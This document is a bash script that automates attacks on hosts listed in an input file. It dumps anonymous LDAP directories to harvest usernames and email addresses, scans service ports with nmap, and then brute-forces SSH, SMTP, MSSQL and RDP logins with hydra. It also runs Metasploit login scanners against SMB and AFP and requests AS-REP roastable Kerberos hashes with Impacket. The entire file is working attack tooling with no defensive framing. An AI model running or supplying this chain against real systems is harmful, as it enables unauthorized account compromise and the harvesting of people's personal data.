cat iplist | while read line
do


DN=$(timeout 3 python3 getdn.py $line 2> /dev/null | grep "dc=" | head -n 1 | cut -d " " -f 5 )

if [[ ! -z "$DN" ]];then
echo "=============== [Info] ==============="
echo $line
echo $DN

urltmp=${DN//dc=/}
url=${urltmp//,/.}

echo $url


dump=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null)


#Grab Users via uid
echo "=========== [Users via uid] ==========="
users=$(echo "$dump" | grep  "\<uid: " | cut -d " " -f 2)
echo "$users"
echo "$users" > userlist



#Grab Users via dn: uid
users=$(echo "$dump"  | grep "dn: uid=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
echo "=========== [Users via dn] ==========="
echo "$users"
echo "$users" >> userlist

#Grab Users via member: cn

users=$(echo "$dump"  | grep "member: cn=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
echo "========= [Users via member] ========="
echo "$users"
echo "$users" >> userlist


#Grab Users via memberUid:

users=$(echo "$dump"  | grep "memberUid" | cut -d " " -f 2)
echo "======= [Users via memberUid] ========"
echo "$users"
echo "$users" >> userlist




users=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  | cut -d "@" -f 1)
echo "========= [Users via mail] =========="
echo "$users"
echo "$users" >> userlist

#Grab  mail:

mails=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  )
echo "============== [Mail] ==============="
echo "$mails"
echo "$mails" >> mails

#remove users duplicates

sort userlist | uniq -i > users
echo "=========== [Unique users] ==========="
cat users

users=$(cat users)

if [[ ! -z "$users" ]];then
echo "=========== [Scan Services] ==========="
scan_res=$(nmap $line -p 22,25,88,389,445,548,1433,3389)

ssh_svc=$(echo "$scan_res" | grep "22/tcp   open ")
smtp_svc=$(echo "$scan_res" | grep "25/tcp   open")
kerb_svc=$(echo "$scan_res" | grep "88/tcp   open")
#ldap_svc=$(echo "$scan_res" | grep "389/tcp  open")
smb_svc=$(echo "$scan_res" | grep "445/tcp  open")
afp_svc=$(echo "$scan_res" | grep "548/tcp  open")
mssql_svc=$(echo "$scan_res" | grep "1433/tcp open")
rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")

#if [[ ! -z "$ldap_svc" ]];then
#echo "===> LDAP Open : Enum With Hydra Ldap_bruteforce (broken)"
#bash create_user_password_list.sh $line > userpass
#hydra -C userpass $line -m $DN ldap2 
#echo "===> LDAP Closed"
#fi


if [[ ! -z "$ssh_svc" ]];then
echo "===> SSH Open : Enum With hydra ssh"
bash create_user_password_list.sh > userpass
hydra -C userpass -t 4 -V $line ssh
#echo "===> SSH Open : Enum With MSF MODULE SSH_Login"
#msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set THREADS 10; exploit; exit;"
else 
echo "===> SSH Closed"
fi


if [[ ! -z "$smtp_svc" ]];then
if [[ ! -z "$mails" ]];then
echo "===> SMTP Open and mails dumped : Enum with hydra smtp "
bash create_mail_password_list.sh > mailpass
hydra -C mailpass $line smtp -V
else 
echo "===> SMTP Open But no mails "
fi
else
echo "===> SMTP Closed"
fi



if [[ ! -z "$kerb_svc" ]];then
echo "===> Kerberos Open : Impacket GetNPUsers "
impacket-GetNPUsers -dc-ip $line $url/ -usersfile users
else 
echo "===> Kerberos Closed"
fi


if [[ ! -z "$smb_svc" ]];then
echo "===> SMB Open : Enum With MSF MODULE SMB_Login (CTRL+C to skip)"
msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;"
else 
echo "===> SMB Closed"
fi


if [[ ! -z "$afp_svc" ]];then
echo "===> AFP Open : Enum With MSF MODULE AFP_Login"
msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
else 
echo "===> AFP Closed"
fi


if [[ ! -z "$mssql_svc" ]];then
echo "===> MSSQL Open : Enum With Hydra MSSQL"
bash create_user_password_list.sh > userpass
hydra -C userpass $line mssql
else 
echo "===> MSSQL Closed"
fi


if [[ ! -z "$rdp_svc" ]];then
echo "===> RDP Open : Enum With Hydra RDP"
bash create_user_password_list.sh > userpass
hydra -t 1 -V -f -C userpass rdp://$line
else 
echo "===> RDP Closed"
fi


if [[ -z "$ssh_svc" && -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
echo "============= [Fast Scan] ============="
nmap $line  -F| grep open
fi

else 

echo "============= [Full Dump] ============="
echo "$dump" 

fi




echo "======================================="
echo ""
echo ""
fi

done
